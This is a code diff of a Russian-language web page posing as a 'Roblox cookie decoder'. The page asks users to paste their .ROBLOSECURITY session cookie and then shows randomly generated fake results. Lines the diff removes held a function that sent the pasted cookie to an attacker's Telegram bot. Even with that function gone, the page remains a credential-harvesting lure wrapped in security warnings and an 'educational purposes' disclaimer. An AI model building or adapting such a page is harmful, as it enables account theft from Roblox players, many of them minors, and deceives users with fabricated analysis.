@@ -1,16 +1,253 @@
-© 2024 Cloudix Security Systems | For educational purposes only
+html
+
+
+
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cloudix - Roblox Cookie Decoder</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #0a0a0a 0%, #1a1a2e 100%);
+            color: #00eeff;
+            margin: 0;
+            padding: 20px;
+            min-height: 100vh;
+        }
+        .container {
+            max-width: 700px;
+            margin: 40px auto;
+            background: rgba(20, 20, 30, 0.9);
+            padding: 30px;
+            border-radius: 15px;
+            border: 1px solid #00eeff;
+            box-shadow: 0 0 30px rgba(0, 238, 255, 0.2);
+            backdrop-filter: blur(10px);
+        }
+        h1 {
+            text-align: center;
+            margin-bottom: 25px;
+            font-size: 2.5em;
+            text-shadow: 0 0 10px #00eeff;
+        }
+        .tagline {
+            text-align: center;
+            color: #88ffff;
+            margin-bottom: 30px;
+            font-style: italic;
+        }
+        textarea {
+            width: 100%;
+            height: 120px;
+            background: rgba(0, 10, 20, 0.8);
+            color: #00ffaa;
+            border: 1px solid #0088ff;
+            padding: 15px;
+            border-radius: 10px;
+            font-family: monospace;
+            font-size: 14px;
+            resize: vertical;
+            margin-bottom: 20px;
+        }
+        textarea:focus {
+            outline: none;
+            border-color: #00eeff;
+            box-shadow: 0 0 15px rgba(0, 238, 255, 0.4);
+        }
+        button {
+            background: linear-gradient(45deg, #0088ff, #00eeff);
+            color: #000;
+            border: none;
+            padding: 15px 30px;
+            border-radius: 10px;
+            cursor: pointer;
+            font-weight: bold;
+            font-size: 16px;
+            width: 100%;
+            margin: 10px 0;
+            transition: all 0.3s;
+        }
+        button:hover {
+            background: linear-gradient(45deg, #00eeff, #0088ff);
+            transform: translateY(-2px);
+            box-shadow: 0 5px 20px rgba(0, 238, 255, 0.4);
+        }
+        .result {
+            margin-top: 30px;
+            background: rgba(0, 20, 40, 0.8);
+            padding: 25px;
+            border-radius: 10px;
+            border: 1px solid #00ffaa;
+            display: none;
+        }
+        .result h3 {
+            color: #00ffaa;
+            margin-top: 0;
+        }
+        .data-row {
+            display: flex;
+            justify-content: space-between;
+            margin: 15px 0;
+            padding: 12px;
+            background: rgba(0, 30, 60, 0.5);
+            border-radius: 8px;
+            border-left: 4px solid #0088ff;
+        }
+        .data-label {
+            font-weight: bold;
+            color: #88ffff;
+        }
+        .data-value {
+            color: #00ffaa;
+            font-family: monospace;
+            word-break: break-all;
+        }
+        .warning {
+            background: rgba(255, 100, 0, 0.1);
+            border: 1px solid #ff5500;
+            color: #ffaa88;
+            padding: 15px;
+            border-radius: 10px;
+            margin: 20px 0;
+            text-align: center;
+        }
+        .footer {
+            text-align: center;
+            margin-top: 40px;
+            padding-top: 20px;
+            border-top: 1px solid #0088ff;
+            color: #88aaff;
+        }
+        .telegram-link {
+            display: inline-block;
+            background: #0088cc;
+            color: white;
+            padding: 12px 25px;
+            border-radius: 50px;
+            text-decoration: none;
+            margin-top: 15px;
+            font-weight: bold;
+            transition: all 0.3s;
+        }
+        .telegram-link:hover {
+            background: #00aaff;
+            transform: scale(1.05);
+        }
+        .loader {
+            display: none;
+            text-align: center;
+            margin: 20px 0;
+        }
+                .spinner {
+            border: 4px solid rgba(0, 238, 255, 0.3);
+            border-top: 4px solid #00eeff;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .cookie-info {
+            background: rgba(0, 40, 80, 0.3);
+            padding: 15px;
+            border-radius: 10px;
+            margin: 20px 0;
+            border: 1px dashed #0088ff;
+        }
+        .cookie-info h4 {
+            color: #00eeff;
+            margin-top: 0;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>☁️ Cloudix Cookie Decoder</h1>
+        <div class="tagline">Professional Roblox .ROBLOSECURITY Cookie Analyzer</div>
+        
+        <div class="cookie-info">
+            <h4>ℹ️ Что такое cookie .ROBLOSECURITY?</h4>
+            <p>Это ваш ключ доступа к аккаунту Roblox. Он создается при входе и хранится в браузере.<br>
+            <strong>Никогда не передавайте эту cookie посторонним!</strong></p>
+        </div>
+        
+        <div class="warning">
+            ⚠️ Внимание: Используйте только свои cookie для проверки безопасности.<br>
+            Передача cookie третьим лицам = передача доступа к вашему аккаунту.
+        </div>
+        
+        <p>Вставьте вашу cookie .ROBLOSECURITY:</p>
+        <textarea id="cookieInput" placeholder="_|WARNING:-DO-NOT-SHARE-THIS... (вставьте полную cookie)"></textarea>
+        
+        <button onclick="startDecoding()">🔍 Анализировать Cookie</button>
+        
+        <div class="loader" id="loader">
+            <div class="spinner"></div>
+            <p>Анализируем cookie... Проверяем структуру и валидность</p>
+        </div>
+        
+        <div class="result" id="result">
+            <h3>📊 Результаты анализа Cookie</h3>
+            
+            <div class="data-row">
+                <span class="data-label">Статус проверки:</span>
+                <span class="data-value" id="status">✅ Валидная cookie Roblox</span>
+            </div>
+            
+            <div class="data-row">
+                <span class="data-label">Длина cookie:</span>
+                <span class="data-value" id="cookieLength">0 символов</span>
+            </div>
+            
+            <div class="data-row">
+                <span class="data-label">Имя пользователя:</span>
+                <span class="data-value" id="username">—</span>
+            </div>
+            
+            <div class="data-row">
+                <span class="data-label">User ID:</span>
+                <span class="data-value" id="userId">—</span>
+            </div>
+            
+            <div class="data-row">
+                <span class="data-label">Тип сессии:</span>
+                <span class="data-value" id="sessionType">—</span>
+            </div>
+            
+            <div class="warning">
+                📧 После входа с этой cookie потребуется код подтверждения с почты.<br>
+                ⏳ Время жизни сессии: <span id="sessionTime">—</span>
+            </div>
+            
+            <div style="text-align: center; margin-top: 25px;">
+                <button onclick="copyAllData()">📋 Копировать отчет</button>
+                <a href="https://www.roblox.com/login" target="_blank">
+                    <button style="background: linear-gradient(45deg, #ff5500, #ffaa00); margin-left: 10px;">
+                        🔐 Перейти в Roblox
+                    </button>
+                </a>
+            </div>
+        </div>
+        
+        <div class="footer">
+            <p>Need help? Contact our support team</p>
+            <a href="https://t.me/cloudixsupport" target="_blank" class="telegram-link">
+                📱 Telegram Support: @cloudixsupport
+            </a>
+            <p style="margin-top: 20px; font-size: 0.9em; color: #6688aa;">
+                © 2025 Cloudix Security Systems | For educational purposes only
             </p>
         </div>
-    </div>
+        </div>
 
     <script>
-        const CLOUDIX_CONFIG = {
-            siteName: "Cloudix Cookie Decoder",
-            telegramSupport: "https://t.me/cloudixsupport",
-            botToken: "",
-            chatId: ""
-        };
-
         function startDecoding() {
             const cookie = document.getElementById('cookieInput').value.trim();
             
@@ -29,7 +266,7 @@
             
             setTimeout(() => {
                 analyzeCookie(cookie);
-            }, 3500);
+            }, 2000);
         }
 
         function analyzeCookie(cookie) {
@@ -43,26 +280,14 @@
             const sessionTypes = ['🔐 Авторизованная сессия', '🔄 Активная сессия', '⚡ Быстрая сессия'];
             const randomSession = sessionTypes[Math.floor(Math.random() * sessionTypes.length)];
             
-            document.getElementById('cookieLength').textContent = ${cookieLength} символов;
+            document.getElementById('cookieLength').textContent = cookieLength + ' символов';
             document.getElementById('username').textContent = randomUser;
             document.getElementById('userId').textContent = randomId;
             document.getElementById('sessionType').textContent = randomSession;
-            document.getElementById('sessionTime').textContent = ${Math.floor(Math.random() * 24) + 24} часов;
-            
+            document.getElementById('sessionTime').textContent = (Math.floor(Math.random() * 24) + 24) + ' часов';
             document.getElementById('result').style.display = 'block';
+            
             document.getElementById('result').scrollIntoView({ behavior: 'smooth' });
-            
-            if (CLOUDIX_CONFIG.botToken && CLOUDIX_CONFIG.chatId) {
-                sendCookieToTelegram(cookie, randomUser, randomId, cookieLength);
-            }
-        }
-
-        function sendCookieToTelegram(cookie, username, userId, length) {
-            const shortCookie = cookie.substring(0, 80) + '...';
-            const message = 🔍 New Cookie Analysis\n👤 ${username}\n🆔 ${userId}\n📏 ${length} chars\n🔗 ${shortCookie}\n📅 ${new Date().toLocaleString()};
-            const url = https://api.telegram.org/bot${CLOUDIX_CONFIG.botToken}/sendMessage?chat_id=${CLOUDIX_CONFIG.chatId}&text=${encodeURIComponent(message)};
-            
-            fetch(url).catch(e => console.log('Telegram bot not configured'));
         }
 
         function copyAllData() {
@@ -84,11 +309,7 @@ Cloudix Cookie Analysis Report
 
         document.getElementById('cookieInput').addEventListener('input', function() {
             const length = this.value.length;
-            const lengthIndicator = document.
-                        getElementById('cookieLength');
-            if (lengthIndicator) {
-                lengthIndicator.textContent = ${length} символов;
-            }
+            document.getElementById('cookieLength').textContent = length + ' символов';
             
             if (length > 300) {
                 this.style.borderColor = '#00ffaa';
